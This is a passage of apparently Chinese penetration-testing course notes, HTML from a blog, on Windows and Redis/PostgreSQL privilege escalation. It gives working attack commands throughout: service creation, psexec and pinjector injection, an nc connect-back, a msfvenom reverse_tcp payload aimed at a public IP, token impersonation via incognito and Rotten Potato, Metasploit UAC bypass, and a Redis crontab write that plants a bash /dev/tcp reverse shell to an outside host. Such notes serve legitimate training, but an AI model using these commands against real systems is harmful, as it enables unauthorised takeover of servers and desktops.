binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact（实战中可以将cmd路径换成网站wehshell路径执行上线）</p></li><li><p>#运行服务</p><p>sc start syscmd</p></li></ul><h5 id="3、适用版本：Test-in-Win2012-and-Win2008-amp-Win2016-其他未测-基本可以"><a href="#3、适用版本：Test-in-Win2012-and-Win2008-amp-Win2016-其他未测-基本可以" class="headerlink" title="3、适用版本：Test in Win2012 and Win2008 &amp; Win2016 其他未测 基本可以"></a>3、适用版本：Test in Win2012 and Win2008 &amp; Win2016 其他未测 基本可以</h5><p>微软官方提权exe文件：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><h6 id="psexec-exe-accepteula-s-i-d-cmd-调用运行cmd"><a href="#psexec-exe-accepteula-s-i-d-cmd-调用运行cmd" class="headerlink" title="psexec.exe -accepteula -s -i -d cmd #调用运行cmd"></a>psexec.exe -accepteula -s -i -d cmd #调用运行cmd</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420114712336.png" alt="image-20230420114712336"></p><h6 id="但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务"><a href="#但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务" class="headerlink" title="但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务"></a>但是个人主机可能不行，提示没有这个服务，但是服务器主机一般都有这个服务</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420115028314.png" alt="image-20230420115028314"></p><h3 id="WIN-本地用户-进程迁移注入获取"><a href="#WIN-本地用户-进程迁移注入获取" class="headerlink" title="#WIN-本地用户-进程迁移注入获取"></a>#WIN-本地用户-进程迁移注入获取</h3><h6 id="相当于开了一后门，注入到其他用户进程下！"><a href="#相当于开了一后门，注入到其他用户进程下！" class="headerlink" title="相当于开了一后门，注入到其他用户进程下！"></a>相当于开了一后门，注入到其他用户进程下！</h6><h5 id="1、Win2008以前版本-Test-in-Win2k3-本地权限-本地虚拟机"><a href="#1、Win2008以前版本-Test-in-Win2k3-本地权限-本地虚拟机" class="headerlink" title="1、Win2008以前版本 -Test in Win2k3-本地权限-本地虚拟机"></a>1、Win2008以前版本 -Test in Win2k3-本地权限-本地虚拟机</h5><ul><li><h6 id="pinjector-l"><a href="#pinjector-l" class="headerlink" title="pinjector -l"></a>pinjector -l</h6></li></ul><h6 id="相当于在进程里面加一个线程，享用当前权限"><a href="#相当于在进程里面加一个线程，享用当前权限" class="headerlink" title="相当于在进程里面加一个线程，享用当前权限"></a>相当于在进程里面加一个线程，享用当前权限</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141423244.png" alt="image-20230420141423244"></p><ul><li><h6 id="pinjector-p-420-cmd-3333"><a href="#pinjector-p-420-cmd-3333" class="headerlink" title="pinjector -p 420 cmd 3333"></a>pinjector -p 420 cmd 3333</h6></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141338440.png" alt="image-20230420141338440"></p><ul><li><h6 id="nc-192-168-46-149-3333"><a href="#nc-192-168-46-149-3333" class="headerlink" title="nc 192.168.46.149 3333"></a>nc 192.168.46.149 3333</h6></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141206943.png" alt="image-20230420141206943"></p><h5 id="2、MSF进程注入-本地权限-Win2008-amp-2012-amp-2016-阿里云服务器"><a href="#2、MSF进程注入-本地权限-Win2008-amp-2012-amp-2016-阿里云服务器" class="headerlink" title="2、MSF进程注入 本地权限-Win2008&amp;2012&amp;2016-阿里云服务器"></a>2、MSF进程注入 本地权限-Win2008&amp;2012&amp;2016-阿里云服务器</h5><p>1、msf生成木马执行上线后，查看为administrator权限</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420141812861.png" alt="image-20230420141812861"></p><p>2、ps &#x2F;&#x2F;查看哪个进程是system权限</p><p>挑选一个system权限的进程</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420142007501.png" alt="image-20230420142007501"></p><p>3、migrate PID &#x2F;&#x2F;迁移对应PID</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420142336613.png" alt="image-20230420142336613"></p><h3 id="WIN-本地用户-Web-令牌窃取-amp-土豆（只有土豆才支持web低权限提权system）"><a href="#WIN-本地用户-Web-令牌窃取-amp-土豆（只有土豆才支持web低权限提权system）" class="headerlink" title="#WIN-本地用户-Web-令牌窃取&amp;土豆（只有土豆才支持web低权限提权system）"></a>#WIN-本地用户-Web-令牌窃取&amp;土豆（只有土豆才支持web低权限提权system）</h3><h5 id="令牌窃取-Win2008-Win2012-Win2016-阿里云服务器"><a href="#令牌窃取-Win2008-Win2012-Win2016-阿里云服务器" class="headerlink" title="令牌窃取 Win2008 Win2012 Win2016 阿里云服务器"></a>令牌窃取 Win2008 Win2012 Win2016 阿里云服务器</h5><p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。</p><p>所以当一个攻击者需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。</p><h5 id="1、本地权限-Test-in-Win2008、12、16-阿里云服务器"><a href="#1、本地权限-Test-in-Win2008、12、16-阿里云服务器" class="headerlink" title="1、本地权限 - Test in Win2008、12、16 阿里云服务器"></a>1、本地权限 - Test in Win2008、12、16 阿里云服务器</h5><p><code>1、msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=3333 -f exe -o msf.exe</code></p><p><code>2、use incognito</code></p><p><code>3、list_tokens -u</code></p><p><code>4、impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p><h6 id="获得system权限"><a href="#获得system权限" class="headerlink" title="获得system权限"></a>获得system权限</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420143151351.png" alt="image-20230420143151351"></p><h5 id="2、Web权限-Test-in-Win2008-12-16-阿里云服务器-（低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）"><a href="#2、Web权限-Test-in-Win2008-12-16-阿里云服务器-（低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）" class="headerlink" title="2、Web权限 - Test in Win2008 12 16 阿里云服务器 （低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）"></a>2、Web权限 - Test in Win2008 12 16 阿里云服务器 （低权限网站权限需要借助烂土豆令牌窃取漏洞来提升到syste权限）</h5><h6 id="在上传msf-exe获取网站权限后，上传土豆"><a href="#在上传msf-exe获取网站权限后，上传土豆" class="headerlink" title="在上传msf.exe获取网站权限后，上传土豆"></a>在上传msf.exe获取网站权限后，上传土豆</h6><p><code>execute -cH -f ./potato.exe //配合烂土豆</code></p><p><code>use incognito</code></p><p><code>list_tokens -u</code></p><p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144232795.png" alt="image-20230420144232795"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144401503.png" alt="image-20230420144401503"></p><ul><li><h5 id="补充点：UAC"><a href="#补充点：UAC" class="headerlink" title="补充点：UAC"></a>补充点：UAC</h5></li></ul><h6 id="铭说-浅析UAC原理及绕过提权-FreeBuf网络安全行业门户"><a href="#铭说-浅析UAC原理及绕过提权-FreeBuf网络安全行业门户" class="headerlink" title="铭说 | 浅析UAC原理及绕过提权 - FreeBuf网络安全行业门户"></a><a href="https://www.freebuf.com/articles/security-management/262884.html">铭说 | 浅析UAC原理及绕过提权 - FreeBuf网络安全行业门户</a></h6><h6 id="在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）"><a href="#在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）" class="headerlink" title="在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）"></a>在administrtor权限下，msf执行getsystem，会自动化进行提权（自动使用令牌窃取、进程注入等常规方法进行提权）</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420144914566.png" alt="image-20230420144914566"></p><h6 id="上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败"><a href="#上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败" class="headerlink" title="上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败"></a>上面的方法经测试Win2008、12、16都适用，但是在本地win10上执行会失败</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145519708.png" alt="image-20230420145519708"></p><h6 id="是因为电脑上有UAC"><a href="#是因为电脑上有UAC" class="headerlink" title="是因为电脑上有UAC"></a>是因为电脑上有UAC</h6><h6 id="提权-Windows-UAC-提权-CVE-2019-1388-肖洋肖恩、-博客园-cnblogs-com"><a href="#提权-Windows-UAC-提权-CVE-2019-1388-肖洋肖恩、-博客园-cnblogs-com" class="headerlink" title="[提权]Windows UAC 提权(CVE-2019-1388) - 肖洋肖恩、 - 博客园 (cnblogs.com)"></a>[<a href="https://www.cnblogs.com/-mo-/p/12088056.html">提权]Windows UAC 提权(CVE-2019-1388) - 肖洋肖恩、 - 博客园 (cnblogs.com)</a></h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145450191.png" alt="image-20230420145450191"></p><h6 id="就像这样，打开一个程序前会提示是否打开"><a href="#就像这样，打开一个程序前会提示是否打开" class="headerlink" title="就像这样，打开一个程序前会提示是否打开"></a>就像这样，打开一个程序前会提示是否打开</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420145632849.png" alt="image-20230420145632849"></p><ul><li><h5 id="下面演示win7的（开启UAC）"><a href="#下面演示win7的（开启UAC）" class="headerlink" title="下面演示win7的（开启UAC）"></a>下面演示win7的（开启UAC）</h5></li></ul><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420162855725.png" alt="image-20230420162855725"></p><h6 id="开启一个窗口监听，等待执行msf-exe"><a href="#开启一个窗口监听，等待执行msf-exe" class="headerlink" title="开启一个窗口监听，等待执行msf.exe"></a>开启一个窗口监听，等待执行msf.exe</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420152800989.png" alt="image-20230420152800989"></p><h6 id="如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC-先设为UCA-1级"><a href="#如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC-先设为UCA-1级" class="headerlink" title="如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC,先设为UCA 1级"></a>如果直接执行getsystem的话，无法得到权限，因为这里WIN7开启了UAC,先设为UCA 1级</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153223912.png" alt="image-20230420153223912"></p><h6 id="在msf上search-uac的bypass模块"><a href="#在msf上search-uac的bypass模块" class="headerlink" title="在msf上search uac的bypass模块"></a>在msf上search uac的bypass模块</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420151617775.png" alt="image-20230420151617775"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420151946717.png" alt="image-20230420151946717"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153410124.png" alt="image-20230420153410124"></p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420152955896.png" alt="image-20230420152955896"></p><h6 id="如果设置UAC-2级"><a href="#如果设置UAC-2级" class="headerlink" title="如果设置UAC 2级"></a>如果设置UAC 2级</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153705257.png" alt="image-20230420153705257"></p><h6 id="还是bypass成功"><a href="#还是bypass成功" class="headerlink" title="还是bypass成功"></a>还是bypass成功</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420153739812.png" alt="image-20230420153739812"></p><h6 id="但是如果设置成最高级别用相同的模块，会提示失败不能bypass-UAC"><a href="#但是如果设置成最高级别用相同的模块，会提示失败不能bypass-UAC" class="headerlink" title="但是如果设置成最高级别用相同的模块，会提示失败不能bypass UAC"></a>但是如果设置成最高级别用相同的模块，会提示失败不能bypass UAC</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420162710524.png" alt="image-20230420162710524"></p><h6 id="这里使用ask触发UAC询问的模块"><a href="#这里使用ask触发UAC询问的模块" class="headerlink" title="这里使用ask触发UAC询问的模块"></a>这里使用ask触发UAC询问的模块</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420163504168.png" alt="image-20230420163504168"></p><h6 id="如果受害机击了”是“的话，输入getsystem将会提升权限为system"><a href="#如果受害机击了”是“的话，输入getsystem将会提升权限为system" class="headerlink" title="如果受害机击了”是“的话，输入getsystem将会提升权限为system"></a>如果受害机击了”是“的话，输入getsystem将会提升权限为system</h6><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420163625006.png" alt="image-20230420163625006"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day100 权限提升-数据库&amp;Redis&amp;Postgre&amp;第三方软件&amp;TV&amp;向日葵&amp;服务类</title>
      <link href="/2023/04/17/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/"/>
      <url>/2023/04/17/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day100-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93-Redis-Postgre-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-TV-%E5%90%91%E6%97%A5%E8%91%B5-%E6%9C%8D%E5%8A%A1%E7%B1%BB/image-20230423162019514.png" alt="image-20230423162019514"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、数据库提权-Redis&amp;PostgreSQL等</p><p>2、第三方提权-TV&amp;向日葵&amp;Navicat等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-数据库-Redis数据库权限提升-计划任务"><a href="#➢-数据库-Redis数据库权限提升-计划任务" class="headerlink" title="➢ 数据库-Redis数据库权限提升-计划任务"></a>➢ 数据库-Redis数据库权限提升-计划任务</h4><h4 id="➢-数据库-PostgreSQL数据库权限提升-漏洞"><a href="#➢-数据库-PostgreSQL数据库权限提升-漏洞" class="headerlink" title="➢ 数据库-PostgreSQL数据库权限提升-漏洞"></a>➢ 数据库-PostgreSQL数据库权限提升-漏洞</h4><h4 id="➢-三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据"><a href="#➢-三方应用-Teamviewer-amp-向日葵-amp-Navivat-凭据" class="headerlink" title="➢ 三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据"></a>➢ 三方应用-Teamviewer&amp;向日葵&amp;Navivat-凭据</h4></blockquote><h3 id="数据库-Redis数据库权限提升-计划任务"><a href="#数据库-Redis数据库权限提升-计划任务" class="headerlink" title="#数据库-Redis数据库权限提升-计划任务"></a>#数据库-Redis数据库权限提升-计划任务</h3><h5 id="连接-未授权或有密码-利用如下方法提权"><a href="#连接-未授权或有密码-利用如下方法提权" class="headerlink" title="连接(未授权或有密码)-利用如下方法提权"></a>连接(未授权或有密码)-利用如下方法提权</h5><h5 id="采用未授权直接利用，密码进入需获取配置文件读取"><a href="#采用未授权直接利用，密码进入需获取配置文件读取" class="headerlink" title="采用未授权直接利用，密码进入需获取配置文件读取"></a>采用未授权直接利用，密码进入需获取配置文件读取</h5><p><a href="https://www.cnblogs.com/zpchcbd/p/11739232.html">redis提权 - zpchcbd - 博客园 (cnblogs.com)</a></p><h6 id="1、设置键值为反弹命令的计划任务写法"><a href="#1、设置键值为反弹命令的计划任务写法" class="headerlink" title="1、设置键值为反弹命令的计划任务写法"></a>1、设置键值为反弹命令的计划任务写法</h6><h6 id="2、设置写入目录为-x2F-var-x2F-spool-x2F-cron-x2F"><a href="#2、设置写入目录为-x2F-var-x2F-spool-x2F-cron-x2F" class="headerlink" title="2、设置写入目录为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;"></a>2、设置写入目录为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</h6><h6 id="3、设置写入文件名为xiaodi"><a href="#3、设置写入文件名为xiaodi" class="headerlink" title="3、设置写入文件名为xiaodi"></a>3、设置写入文件名为xiaodi</h6><h6 id="4、保存执行"><a href="#4、保存执行" class="headerlink" title="4、保存执行"></a>4、保存执行</h6><ul><li>set x “\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.114.103.63&#x2F;7788 0&gt;&amp;1\n”</li><li>config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</li><li>config set dbfilename xiaodi</li><li>save</li></ul><p>参考：<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><h6 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1).利用计划任务执行命令反弹shell"></a>(1).利用计划任务执行命令反弹shell</h6><h6 id="2-写ssh-keygen公钥然后使用私钥登陆"><a href="#2-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="(2).写ssh-keygen公钥然后使用私钥登陆"></a>(2).写ssh-keygen公钥然后使用私钥登陆</h6><h6 id="3-权限较低往web物理路径写webshell"><a href="#3-权限较低往web物理路径写webshell" 